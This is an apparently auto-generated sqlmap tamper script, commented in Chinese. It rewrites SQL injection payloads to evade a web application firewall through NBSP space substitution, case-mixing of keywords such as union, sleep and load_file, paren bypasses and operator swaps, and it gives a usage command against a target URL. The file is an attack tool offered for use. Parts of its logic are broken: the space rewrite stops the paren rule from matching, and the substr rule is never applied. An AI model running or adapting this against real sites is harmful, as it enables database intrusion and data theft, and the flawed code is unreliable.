#!/usr/bin/env python3
"""
sqlmap tamper 脚本 (自动生成)
生成时间: 2026-08-11 11:16:31
WAF 模式: keyword_plus_space
绕过复杂度: complex

替换规则:
[
  {
    "type": "space_replace",
    "from": " ",
    "to": "%a0",
    "desc": "空格 → NBSP"
  },
  {
    "type": "case_mix",
    "from": "union",
    "to": "UnIoN",
    "desc": "union → UnIoN (大小写混淆)"
  },
  {
    "type": "case_mix",
    "from": "by",
    "to": "By",
    "desc": "by → By (大小写混淆)"
  },
  {
    "type": "case_mix",
    "from": "having",
    "to": "HaViNg",
    "desc": "having → HaViNg (大小写混淆)"
  },
  {
    "type": "case_mix",
    "from": "into",
    "to": "InTo",
    "desc": "into → InTo (大小写混淆)"
  },
  {
    "type": "case_mix",
    "from": "insert",
    "to": "InSeRt",
    "desc": "insert → InSeRt (大小写混淆)"
  },
  {
    "type": "case_mix",
    "from": "drop",
    "to": "DrOp",
    "desc": "drop → DrOp (大小写混淆)"
  },
  {
    "type": "case_mix",
    "from": "and",
    "to": "AnD",
    "desc": "and → AnD (大小写混淆)"
  },
  {
    "type": "case_mix",
    "from": "if",
    "to": "If",
    "desc": "if → If (大小写混淆)"
  },
  {
    "type": "case_mix",
    "from": "sleep",
    "to": "SlEeP",
    "desc": "sleep → SlEeP (大小写混淆)"
  },
  {
    "type": "case_mix",
    "from": "benchmark",
    "to": "BeNcHmArK",
    "desc": "benchmark → BeNcHmArK (大小写混淆)"
  },
  {
    "type": "case_mix",
    "from": "handler",
    "to": "HaNdLeR",
    "desc": "handler → HaNdLeR (大小写混淆)"
  },
  {
    "type": "case_mix",
    "from": "outfile",
    "to": "OuTfIlE",
    "desc": "outfile → OuTfIlE (大小写混淆)"
  },
  {
    "type": "case_mix",
    "from": "load_file",
    "to": "LoAd_fIlE",
    "desc": "load_file → LoAd_fIlE (大小写混淆)"
  },
  {
    "type": "case_mix",
    "from": "rand",
    "to": "RaNd",
    "desc": "rand → RaNd (大小写混淆)"
  },
  {
    "type": "paren_bypass",
    "keyword": "select",
    "desc": "select + 空格 被拦截, 使用 select( 绕过"
  },
  {
    "type": "paren_bypass",
    "keyword": "from",
    "desc": "from + 空格 被拦截, 使用 from( 绕过"
  },
  {
    "type": "paren_bypass",
    "keyword": "where",
    "desc": "where + 空格 被拦截, 使用 where( 绕过"
  },
  {
    "type": "comment_replace",
    "from": "-- ",
    "to": "#",
    "desc": "-- → # (注释符替换)"
  },
  {
    "type": "keyword_equiv",
    "from": "and",
    "to": "&&",
    "desc": "and → && (逻辑运算符等价替换)"
  },
  {
    "type": "operator_func",
    "from": "substr",
    "to": "left/right",
    "desc": "substr → left()+right() (函数等价替换)",
    "note": "需自定义 exploit 实现语义重构"
  }
]

使用方式:
  sqlmap -u "TARGET_URL" --tamper=waf_bypass_tamper.py --batch

注意: 此 tamper 处理字符级替换和简单语义替换。
      对于需要复杂语义重构的 WAF (如 =→locate(), and→^, limit→group_concat),
      请使用生成的自定义 exploit 脚本。
"""

import re

# 替换规则 (从 WAF 分析结果导入)
RULES = [ {'desc': '空格 → NBSP', 'from': ' ', 'to': '%a0', 'type': 'space_replace'},
  {'desc': 'union → UnIoN (大小写混淆)', 'from': 'union', 'to': 'UnIoN', 'type': 'case_mix'},
  {'desc': 'by → By (大小写混淆)', 'from': 'by', 'to': 'By', 'type': 'case_mix'},
  {'desc': 'having → HaViNg (大小写混淆)', 'from': 'having', 'to': 'HaViNg', 'type': 'case_mix'},
  {'desc': 'into → InTo (大小写混淆)', 'from': 'into', 'to': 'InTo', 'type': 'case_mix'},
  {'desc': 'insert → InSeRt (大小写混淆)', 'from': 'insert', 'to': 'InSeRt', 'type': 'case_mix'},
  {'desc': 'drop → DrOp (大小写混淆)', 'from': 'drop', 'to': 'DrOp', 'type': 'case_mix'},
  {'desc': 'and → AnD (大小写混淆)', 'from': 'and', 'to': 'AnD', 'type': 'case_mix'},
  {'desc': 'if → If (大小写混淆)', 'from': 'if', 'to': 'If', 'type': 'case_mix'},
  {'desc': 'sleep → SlEeP (大小写混淆)', 'from': 'sleep', 'to': 'SlEeP', 'type': 'case_mix'},
  {'desc': 'benchmark → BeNcHmArK (大小写混淆)', 'from': 'benchmark', 'to': 'BeNcHmArK', 'type': 'case_mix'},
  {'desc': 'handler → HaNdLeR (大小写混淆)', 'from': 'handler', 'to': 'HaNdLeR', 'type': 'case_mix'},
  {'desc': 'outfile → OuTfIlE (大小写混淆)', 'from': 'outfile', 'to': 'OuTfIlE', 'type': 'case_mix'},
  {'desc': 'load_file → LoAd_fIlE (大小写混淆)', 'from': 'load_file', 'to': 'LoAd_fIlE', 'type': 'case_mix'},
  {'desc': 'rand → RaNd (大小写混淆)', 'from': 'rand', 'to': 'RaNd', 'type': 'case_mix'},
  {'desc': 'select + 空格 被拦截, 使用 select( 绕过', 'keyword': 'select', 'type': 'paren_bypass'},
  {'desc': 'from + 空格 被拦截, 使用 from( 绕过', 'keyword': 'from', 'type': 'paren_bypass'},
  {'desc': 'where + 空格 被拦截, 使用 where( 绕过', 'keyword': 'where', 'type': 'paren_bypass'},
  {'desc': '-- → # (注释符替换)', 'from': '-- ', 'to': '#', 'type': 'comment_replace'},
  {'desc': 'and → && (逻辑运算符等价替换)', 'from': 'and', 'to': '&&', 'type': 'keyword_equiv'},
  { 'desc': 'substr → left()+right() (函数等价替换)',
    'from': 'substr',
    'note': '需自定义 exploit 实现语义重构',
    'to': 'left/right',
    'type': 'operator_func'}]

def tamper(payload, **kwargs):
    """
    对 sqlmap payload 应用 WAF 绕过替换
    支持组合策略: 多条规则依次应用
    """
    if not payload:
        return payload

    for rule in RULES:
        rtype = rule["type"]

        if rtype == "space_replace":
            # 空格替换为空白替代符
            payload = payload.replace(rule["from"], rule["to"])

        elif rtype == "case_mix":
            # 关键词大小写混淆 (正则, 不区分大小写)
            pattern = re.compile(re.escape(rule["from"]), re.IGNORECASE)
            payload = pattern.sub(rule["to"], payload)

        elif rtype == "comment_replace":
            # 注释符替换
            payload = payload.replace(rule["from"], rule["to"])

        elif rtype == "paren_bypass":
            # 关键词+空格 -> 关键词(  (select  -> select()
            # NOTE: 括号闭合由 sqlmap 的后续 payload 语法保证
            kw = rule["keyword"]
            pattern = re.compile(r'\b' + kw + r'\s+(?!\()', re.IGNORECASE)
            payload = pattern.sub(kw + '(', payload)

        elif rtype == "operator_func":
            # 运算符→函数替换 (如 = → locate())
            # tamper 只能做简单替换, 复杂语义重构需自定义 exploit
            # = → locate(A, B) 无法在 tamper 中自动实现, 仅做标记提示
            # 但可以替换 = 为 LIKE 或其他简单替代
            op = rule["from"]
            if op == "=" and "like" not in payload.lower():
                # 不替换 WHERE 中的 = (需要语义重构), 仅替换比较表达式
                # 这是一个保守策略, 避免 break sqlmap 的 payload 结构
                pass  # 跳过, 需要自定义 exploit

        elif rtype == "keyword_equiv":
            # 关键词等价替换 (如 and → &&)
            payload = re.sub(
                r'\b' + re.escape(rule["from"]) + r'\b',
                rule["to"],
                payload,
                flags=re.IGNORECASE
            )

    return payload
